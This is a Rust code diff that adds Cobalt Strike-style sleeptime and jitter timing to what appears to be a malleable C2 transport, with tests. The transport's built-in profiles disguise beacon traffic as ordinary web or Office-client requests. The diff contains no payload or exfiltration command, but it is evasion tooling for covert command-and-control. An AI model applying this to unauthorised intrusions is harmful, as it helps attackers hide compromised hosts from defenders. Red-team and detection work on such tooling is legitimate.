@@ -67,9 +67,43 @@ pub struct MalleableProfile {
     /// `User-Agent` is set separately from the pool; do not duplicate it here.
     pub headers: Vec<(String, String)>,
 
-    /// Jitter percentage (0–100).  Each request sleeps `JITTER_BASE_MS` ± this
-    /// percentage before sending.  0 disables jitter entirely.
+    /// Jitter percentage (0–100).  Each request sleeps `jitter_base_ms` ± this
+    /// percentage before sending.  0 disables the ±variation (a non-zero
+    /// [`Self::jitter_base_ms`] is then used as a fixed delay).
     pub jitter_pct: u8,
+
+    /// Base delay in milliseconds for per-request jitter.
+    ///
+    /// Threaded from a CS profile's `set sleeptime` (ms) / `set jitter` /
+    /// `set timing_baseline`. `0` means "no profile timing": combined with
+    /// `jitter_pct == 0` this keeps `jitter_ms() == 0` (default wire cadence).
+    /// A non-zero `jitter_pct` with a zero base falls back to [`JITTER_BASE_MS`]
+    /// so the three pre-built profiles keep their historical 100 ms ± pct range.
+    pub jitter_base_ms: u64,
+}
+
+/// Map CS-style `sleeptime` (ms), `jitter` (%), and optional `timing_baseline`
+/// onto `(jitter_base_ms, jitter_pct)` for [`MalleableProfile`].
+///
+/// Missing timing (no sleeptime, no jitter, no `timing_baseline`) yields
+/// `(0, 0)` so [`MalleableTransport::jitter_ms`] stays 0 — the default
+/// cadence, matching `padding_max == 0` byte-identical default wire.
+pub fn cs_timing_to_jitter(
+    sleeptime_ms: u64,
+    jitter_pct: u8,
+    timing_baseline: Option<&str>,
+) -> (u64, u8) {
+    let has_timing = timing_baseline.is_some();
+    if sleeptime_ms == 0 && jitter_pct == 0 && !has_timing {
+        (0, 0)
+    } else {
+        let base = if sleeptime_ms > 0 {
+            sleeptime_ms
+        } else {
+            JITTER_BASE_MS
+        };
+        (base, jitter_pct)
+    }
 }
 
 // ---- MalleableTransport ----------------------------------------------------
@@ -140,6 +174,7 @@ impl MalleableTransport {
                 ("Cache-Control".into(), "no-cache".into()),
             ],
             jitter_pct: 20,
+            jitter_base_ms: 0,
         };
         Self::new(base_url, profile)
     }
@@ -168,6 +203,7 @@ impl MalleableTransport {
                 ("X-Client-Version".into(), "16.0.16327.20264".into()),
             ],
             jitter_pct: 10,
+            jitter_base_ms: 0,
         };
         Self::new(base_url, profile)
     }
@@ -197,6 +233,7 @@ impl MalleableTransport {
                 ("Connection".into(), "Keep-Alive".into()),
             ],
             jitter_pct: 15,
+            jitter_base_ms: 0,
         };
         Self::new(base_url, profile)
     }
@@ -217,15 +254,26 @@ impl MalleableTransport {
         ua
     }
 
-    /// Compute a random jitter delay: `JITTER_BASE_MS ± jitter_pct%`.
+    /// Compute a random jitter delay from the profile's timing fields.
     ///
-    /// Returns 0 when `jitter_pct` is 0.
+    /// - `jitter_base_ms == 0 && jitter_pct == 0` → 0 (missing timing / default).
+    /// - `jitter_base_ms == 0 && jitter_pct > 0` → `JITTER_BASE_MS ± pct%`
+    ///   (pre-built profiles).
+    /// - `jitter_base_ms > 0 && jitter_pct == 0` → the base (timing present,
+    ///   no ±variation — e.g. `timing_baseline` set without `set jitter`).
+    /// - both non-zero → `base ± pct%`.
     fn jitter_ms(&self) -> u64 {
-        if self.profile.jitter_pct == 0 {
+        let base = self.profile.jitter_base_ms;
+        let pct = self.profile.jitter_pct;
+        if base == 0 && pct == 0 {
             return 0;
         }
-        let base = JITTER_BASE_MS as i64;
-        let range = (base * self.profile.jitter_pct as i64) / 100;
+        let base = if base == 0 { JITTER_BASE_MS } else { base };
+        if pct == 0 {
+            return base;
+        }
+        let base = base as i64;
+        let range = (base * pct as i64) / 100;
         let mut rng = rand::thread_rng();
         let offset: i64 = rng.gen_range(-range..=range);
         (base + offset).max(0) as u64
@@ -429,6 +477,7 @@ mod tests {
             user_agents: vec!["ua1".into()],
             headers: vec![],
             jitter_pct: 0,
+            jitter_base_ms: 0,
         };
         let mut t = MalleableTransport::new("http://x".into(), profile);
 
@@ -446,6 +495,7 @@ mod tests {
             user_agents: vec!["ua1".into(), "ua2".into()],
             headers: vec![],
             jitter_pct: 0,
+            jitter_base_ms: 0,
         };
         let mut t = MalleableTransport::new("http://x".into(), profile);
 
@@ -462,6 +512,7 @@ mod tests {
             user_agents: vec!["x".into()],
             headers: vec![],
             jitter_pct: 0,
+            jitter_base_ms: 0,
         };
         let t = MalleableTransport::new("http://x".into(), profile);
         assert_eq!(t.jitter_ms(), 0);
@@ -475,6 +526,7 @@ mod tests {
             user_agents: vec!["x".into()],
             headers: vec![],
             jitter_pct: 20, // base 100ms ± 20% → 80..120ms
+            jitter_base_ms: 0,
         };
         let t = MalleableTransport::new("http://x".into(), profile);
         for _ in 0..100 {
@@ -504,6 +556,7 @@ mod tests {
             user_agents: vec!["x".into()],
             headers: vec![],
             jitter_pct: 0,
+            jitter_base_ms: 0,
         };
         let t = MalleableTransport::new("http://192.0.2.1".into(), profile);
         // Should return None within the 5 s hard timeout (plus connection
@@ -544,9 +597,85 @@ mod tests {
                 user_agents: vec!["ua".into()],
                 headers: vec![],
                 jitter_pct: 0,
+                jitter_base_ms: 0,
             };
             let _t = MalleableTransport::new("http://x".into(), profile);
             // No panic → mapping handled.
         }
+    }
+
+    fn timing_profile(base_ms: u64, pct: u8) -> MalleableTransport {
+        let profile = MalleableProfile {
+            http_method: "GET".into(),
+            uris: vec!["/".into()],
+            user_agents: vec!["x".into()],
+            headers: vec![],
+            jitter_pct: pct,
+            jitter_base_ms: base_ms,
+        };
+        MalleableTransport::new("http://x".into(), profile)
+    }
+
+    #[test]
+    fn jitter_ms_honors_profile_jitter_and_timing_baseline() {
+        // A CS profile with sleeptime + jitter + timing_baseline must produce
+        // a non-zero delay in the sleeptime ± jitter band.
+        let src = r#"
+set sleeptime "1000";
+set jitter "20";
+set timing_baseline "bursty";
+http-get { client { metadata { print; } } server { output { print; } } }
+http-post { client { output { print; } } server { output { print; } } }
+"#;
+        let p = nyx_profile::parse(src).unwrap();
+        let sleeptime: u64 = p.option("sleeptime").unwrap().as_str().parse().unwrap();
+        let jitter: u8 = p.option("jitter").unwrap().as_str().parse().unwrap();
+        let tb = p.option("timing_baseline").map(|s| s.as_str());
+        assert_eq!(tb.as_deref(), Some("bursty"));
+        let (base, pct) = cs_timing_to_jitter(sleeptime, jitter, tb.as_deref());
+        let t = timing_profile(base, pct);
+        for _ in 0..50 {
+            let j = t.jitter_ms();
+            assert!(
+                j > 0,
+                "profile with jitter/timing_baseline must be non-zero"
+            );
+            assert!(
+                (800..=1200).contains(&j),
+                "jitter {j} outside sleeptime 1000ms ± 20%"
+            );
+        }
+    }
+
+    #[test]
+    fn jitter_ms_default_profile_stays_zero() {
+        // No sleeptime / jitter / timing_baseline → passthrough is a no-op.
+        let src = r#"
+http-get { client { metadata { print; } } server { output { print; } } }
+"#;
+        let p = nyx_profile::parse(src).unwrap();
+        let sleeptime: u64 = p
+            .option("sleeptime")
+            .and_then(|s| s.as_str().parse().ok())
+            .unwrap_or(0);
+        let jitter: u8 = p
+            .option("jitter")
+            .and_then(|s| s.as_str().parse().ok())
+            .unwrap_or(0);
+        let tb = p.option("timing_baseline").map(|s| s.as_str());
+        let (base, pct) = cs_timing_to_jitter(sleeptime, jitter, tb.as_deref());
+        assert_eq!((base, pct), (0, 0));
+        let t = timing_profile(base, pct);
+        assert_eq!(t.jitter_ms(), 0);
+    }
+
+    #[test]
+    fn jitter_ms_timing_baseline_only_is_nonzero() {
+        // `set timing_baseline` with no jitter still threads a base delay.
+        let (base, pct) = cs_timing_to_jitter(0, 0, Some("bursty"));
+        assert_eq!(base, JITTER_BASE_MS);
+        assert_eq!(pct, 0);
+        let t = timing_profile(base, pct);
+        assert_eq!(t.jitter_ms(), JITTER_BASE_MS);
     }
 }
